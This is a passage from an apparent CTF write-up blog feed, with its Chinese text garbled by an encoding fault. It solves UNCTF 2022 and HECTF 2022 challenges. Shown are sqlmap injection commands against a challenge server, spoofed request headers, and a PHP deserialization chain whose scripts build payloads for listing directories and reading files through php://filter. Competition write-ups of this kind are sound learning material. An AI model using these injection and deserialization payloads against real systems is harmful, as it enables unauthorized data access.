å¯†ç®—æ³•ï¼Œé€»è¾‘ä¸ºé€åƒç´ RGBå€¼ç®€å•å¼‚æˆ–ï¼Œè¿˜åŸå³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">c = Image.<span class="built_in">open</span>(<span class="string">r&#x27;flag.png&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">l,h = c.size</span><br><span class="line"><span class="built_in">print</span>(l,h)</span><br><span class="line">m = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(h,l))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">      r1,g1,b1 = c.getpixel((i,j))</span><br><span class="line">      r = g1^b1</span><br><span class="line">      g = r1^r</span><br><span class="line">      b = g1^g</span><br><span class="line">      m.putpixel(((i*<span class="number">1200</span>+j)//<span class="number">787</span>,(i*<span class="number">1200</span>+j)%<span class="number">787</span>),(b,g,r))</span><br><span class="line">m.save(<span class="string">r&#x27;flag.jpg&#x27;</span>)</span><br><span class="line">c.close()</span><br><span class="line">m.close()</span><br></pre></td></tr></table></figure><p>è¿˜åŸå›¾ç‰‡ä¸­çš„flagï¼š<code>UNCTF&#123;93bb442f-2a76-2b6f-c42f-c2297f5fdaf9&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="è´æ–¯å®¶æ—çš„ä¾µç•¥"><a href="#è´æ–¯å®¶æ—çš„ä¾µç•¥" class="headerlink" title="è´æ–¯å®¶æ—çš„ä¾µç•¥"></a>è´æ–¯å®¶æ—çš„ä¾µç•¥</h3><blockquote><p>æç¤º1ï¼šå¦‚æœæ˜æ–‡æ”»å‡»å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨bandzip</p><p>æç¤º2ï¼šä¼šåŠ¨çš„é¼ æ ‡</p></blockquote><p>ç¬¬ä¸€å±‚ï¼Œæ ¹æ®æç¤º1ï¼Œbandzipå‹ç¼©åæ˜æ–‡æ”»å‡»ï¼Œè§£å‹ï¼›</p><p>ç¬¬äºŒå±‚ï¼Œbase64éšå†™ï¼Œè„šæœ¬æå–éšå†™å†…å®¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">stegb64 = <span class="string">&#x27;&#x27;</span>.join(line.split())</span><br><span class="line">rowb64 =  <span class="string">&#x27;&#x27;</span>.join(stegb64.decode(<span class="string">&#x27;base64&#x27;</span>).encode(<span class="string">&#x27;base64&#x27;</span>).split())</span><br><span class="line">offset = <span class="built_in">abs</span>(b64chars.index(stegb64.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>])-b64chars.index(rowb64.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]))</span><br><span class="line">equalnum = stegb64.count(<span class="string">&#x27;=&#x27;</span>) <span class="comment">#no equalnum no offset</span></span><br><span class="line"><span class="keyword">if</span> equalnum:</span><br><span class="line">bin_str += <span class="built_in">bin</span>(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>)])) <span class="comment">#8 ä½ä¸€ç»„</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„å†…å®¹16è¿›åˆ¶è½¬å­—ç¬¦ä¸²ï¼Œå¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼›</p><p>ç¬¬ä¸‰å±‚ï¼Œæ ¹æ®æ–‡ä»¶å†…çš„æç¤º <code>Macro.mrf</code>ï¼ŒçŒœæµ‹ä¸ºé¼ æ ‡è½¨è¿¹è®°å½•ï¼Œä½¿ç”¨Macro Recorderå·¥å…·æ‰“å¼€ï¼Œé€æ¡æŸ¥çœ‹è½¨è¿¹å¾—åˆ°flagï¼š<code>flag&#123;b4s3_1s_v3ry_g0od!!&#125;</code>ã€‚</p><p>â€‹    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;ä¸ºæ·±å…¥è´¯å½»ä¹ è¿‘å¹³æ€»ä¹¦è®°å…³äºäºŒåå¤§æå‡ºçš„ç½‘ç»œå¼ºå›½çš„é‡è¦æ€æƒ³ï¼Œå›´ç»•å»ºè®¾ç½‘ç»œå¼ºå›½çš„æˆ˜ç•¥éƒ¨ç½²ï¼Œå»ºè®¾ç½‘ç»œå¼ºå›½çš„æˆ˜ç•¥éƒ¨ç½²è¦ä¸â€œä¸¤ä¸ªä¸€ç™¾å¹´â€å¥‹æ–—ç›®æ ‡åŒæ­¥æ¨è¿›ï¼Œç”±å¾¡ä¹‹å®‰æ‰¿åŠUNCTF2022ç½‘ç»œå®‰å…¨å¤§èµ›ï¼ˆä»¥ä¸‹ç®€ç§°â€œå¤§èµ›â€ï¼‰å°†äºä»Šå¹´11æœˆä»½å¬å¼€ï¼Œä»¥èµ›äº‹ä¸ºå¥‘æœºï¼Œæå‡ç½‘</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022èµ›" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2022 HECTF</title>
    <link href="https://lazzzaro.github.io/2022/11/07/match-2022-HECTF/"/>
    <id>https://lazzzaro.github.io/2022/11/07/match-2022-HECTF/</id>
    <published>2022-11-07T13:38:28.000Z</published>
    <updated>2022-11-28T16:24:14.457Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>2022HECTFæ˜¯ç”±æ²³åŒ—å¸ˆèŒƒå¤§å­¦SourceCodeæˆ˜é˜Ÿç»„ç»‡çš„é¢å‘å…¨å›½å¤§å­¦ç”Ÿçš„CTFç«æŠ€æ´»åŠ¨ï¼Œæ²³åŒ—å¸ˆèŒƒå¤§å­¦è®¡ç®—æœºä¸ç½‘ç»œç©ºé—´å®‰å…¨å­¦é™¢ä¸»åŠï¼Œæ²³åŒ—çœç½‘ç»œä¸ä¿¡æ¯å®‰å…¨é‡ç‚¹å®éªŒå®¤å’Œæ²³åŒ—å¸ˆèŒƒå¤§å­¦ä¿¡æ¯å®‰å…¨åä¼šæ‰¿åŠï¼Œæ˜¯é¢å‘å…¨å›½å¤§å­¦ç”Ÿçš„ä¸€æ¬¡ç«æŠ€æ´»åŠ¨ã€‚</p><p><strong>Rank: 1</strong></p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="è¿·è·¯çš„å°ç‹®"><a href="#è¿·è·¯çš„å°ç‹®" class="headerlink" title="è¿·è·¯çš„å°ç‹®"></a>è¿·è·¯çš„å°ç‹®</h3><blockquote><p>ç­¾åˆ°é¢˜</p><p>HINTS:</p><p>å®˜ç½‘åœ°å€éœ€å¡«å†™å®Œæ•´(å»ºè®®å¤åˆ¶)ï¼Œæ— è·¯å¾„å³ç»“å°¾ä¸º.cn</p></blockquote><p>è¿›å…¥æ˜¯è¿·æƒ‘æ€§çš„404é¡µé¢ï¼Œä¸”å³é”®å’ŒF12ç¦ç”¨ï¼Œåœ°å€æ æ‰‹åŠ¨æ·»åŠ  <code>view-source:</code> çœ‹åˆ°æºç æç¤º <code>hectfer</code>ã€‚</p><p>è®¿é—® <code>/hectfer</code> æç¤º <code>hebnu is a good site.</code>ï¼Œè®¿é—® <code>/hebnu</code> æç¤º <code>Can you use another way of requesting?</code></p><p>ä¸Šburpsuiteï¼ŒæŒ‰æç¤ºæŒ‰æ­¥éª¤ä¿®æ”¹request headerçš„å‡ å¤„ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /hebnu HTTP/1.1</span><br><span class="line">User-Agent: Internet Explorer</span><br><span class="line">Referer: https://www.hebtu.edu.cn</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure><p>åœ¨responce headeré‡Œçœ‹åˆ°PHPFuckä»£ç ï¼Œæ§åˆ¶å°è¿è¡Œç›´æ¥å¾—åˆ°flagï¼š<code>HECTF&#123;sfe2fsa_f39sjfa_hj93sf_ef0skf3fs&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="æ“å¤©æ³¨"><a href="#æ“å¤©æ³¨" class="headerlink" title="æ“å¤©æ³¨"></a>æ“å¤©æ³¨</h3><p>æ‰¾åˆ°GETå‚æ•°idï¼Œç”¨sqlmapå¯ä»¥ç›´æ¥é€šè¿‡æ—¶é—´ç›²æ³¨è·‘å‡ºflagã€‚</p><p>å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># çˆ†æ•°æ®åº“å</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://121.4.111.50:32614/?id=1&quot;</span> --dbs</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ•°æ®åº“åctfï¼Œçˆ†è¡¨å</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://121.4.111.50:32614/?id=1&quot;</span> -D ctf --tables</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ•°æ®åº“åctfï¼Œè¡¨å3eDf4f07efC9ee16ï¼Œçˆ†åˆ—åå’Œå†…å®¹</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://121.4.111.50:32614/?id=1&quot;</span> -D ctf -T 3eDf4f07efC9ee16 --columns --dump</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="easy-unserialize"><a href="#easy-unserialize" class="headerlink" title="easy_unserialize"></a>easy_unserialize</h3><blockquote><p>ä¸€é“ç¥å¥‡çš„ååºåˆ—åŒ–é¢˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;Welcome to HECTF Have fun!!!ğŸ˜Š&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">         <span class="variable language_">$this</span>-&gt;file = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="variable language_">$this</span>-&gt;file = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$huang</span>;</span><br><span class="line"> <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;éš¾é“æˆ‘çœŸçš„è¦å¤±è´¥äº†ï¼Œå—&quot;</span>.<span class="variable language_">$this</span>-&gt;str;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun1</span>,<span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;huang-&gt;str;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$eee</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$aaa</span>=<span class="string">&quot;who are you?&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$ccc</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;eee-&gt;<span class="title function_ invoke__">flag</span>();</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$css</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;ccc;</span><br><span class="line">     <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$ddd</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$ext</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;ext-&gt;<span class="title function_ invoke__">nisa</span>(<span class="variable">$this</span>-&gt;ddd);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ddd</span>(<span class="variable">$this</span>-&gt;ext);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$gagaga</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$gagaga</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>); </span><br></pre></td></tr></table></figure></blockquote><p>æ„é€ ååºåˆ—åŒ–é“¾ï¼š</p><p><code>A:__wakeup() =&gt; B:__isset() =&gt; C:__toString() =&gt; D:flag() =&gt; B:__call() =&gt; C:__get() =&gt; D:__invoke() =&gt; echo new()</code></p><p>åˆ©ç”¨å†…ç½®ç±» <code>DirectoryIterator</code> + <code>glob://</code>ä¼ªåè®®åˆ—ç›®å½•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>:</span><br><span class="line">    private_ddd = <span class="string">&#x27;DirectoryIterator&#x27;</span></span><br><span class="line">    private_ext = <span class="string">&#x27;glob:///*f*&#x27;</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>:</span><br><span class="line">    public_ccc = D()</span><br><span class="line">    public_eee = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_aaa = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    public_str = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_huang = C()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>:</span><br><span class="line">    private_ddd = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    private_ext = B()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>:</span><br><span class="line">    public_ccc = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_eee = D()</span><br><span class="line">    public_aaa = <span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    public_str = C()</span><br><span class="line">    public_huang = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    public_file = B()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(serialize(A())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># POST payload:</span></span><br><span class="line"><span class="comment"># data = O%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22file%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22str%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22eee%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A1%3A%22%3F%22%3Bs%3A6%3A%22%00D%00ext%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A17%3A%22DirectoryIterator%22%3Bs%3A6%3A%22%00D%00ext%22%3Bs%3A11%3A%22glob%3A///%2Af%2A%22%3B%7Ds%3A3%3A%22eee%22%3Bs%3A1%3A%22%3F%22%3B%7Ds%3A3%3A%22str%22%3Bs%3A1%3A%22%3F%22%3B%7D%7D%7D%7D%7D</span></span><br><span class="line"><span class="comment"># æ–‡ä»¶å /ffflllllaaaaaaggggg.txt</span></span><br></pre></td></tr></table></figure><p>å†åˆ©ç”¨å†…ç½®ç±» <code>SplFileObject</code> + <code>php://filter</code>ä¼ªåè®®è¯»æ–‡ä»¶å†…å®¹ï¼š </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>:</span><br><span class="line">    private_ddd = <span class="string">&#x27;SplFileObject&#x27;</span></span><br><span class="line">    private_ext = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=/ffflllllaaaaaaggggg.txt&#x27;</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>:</span><br><span class="line">    public_ccc = D()</span><br><span class="line">    public_eee = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_aaa = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    public_str = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_huang = C()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>:</span><br><span class="line">    private_ddd = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    private_ext = B()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>:</span><br><span class="line">    public_ccc = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_eee = D()</span><br><span class="line">    public_aaa = <span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    public_str = C()</span><br><span class="line">    public_huang = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    public_file = B()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(serialize(A())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># POST payload</span></span><br><span class="line"><span class="comment"># data = O%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22file%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22str%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22eee%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A1%3A%22%3F%22%3Bs%3A6%3A%22%00D%00ext%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A13%3A%22SplFileObject%22%3Bs%3A6%3A%22%00D%00ext%22%3Bs%3A73%3A%22php%3A//filter/read%3Dconvert.base64-encode/resource%3D/ffflllllaaaaaaggggg.txt%22%3B%7Ds%3A3%3A%22eee%22%3Bs%3A1%3A%22%3F%22%3B%7Ds%3A3%3A%22str%22%3Bs%3A1%3A%22%3F%22%3B%7D%7D%7D%7D%7D</span></span><br><span class="line"><span class="comment"># HECTF&#123;u_find_m</span></span><br><span class="line"><span class="comment"># y_trulyself&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="cute-pipi"><a href="#cute-pipi" class="headerlink" title="cute_pipi"></a>cute_pipi</h3><p>è§‚å¯Ÿé¡µé¢ï¼Œæœ‰å›¾ç‰‡ä¸Šä¼ ç‚¹ï¼Œurlå‘ç°å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œåˆ©ç”¨ä¼ªåè®®è¯»æºç ï¼š</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;FROM_INDEX&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]) ? <span class="string">&#x27;home&#x27;</span> : <span 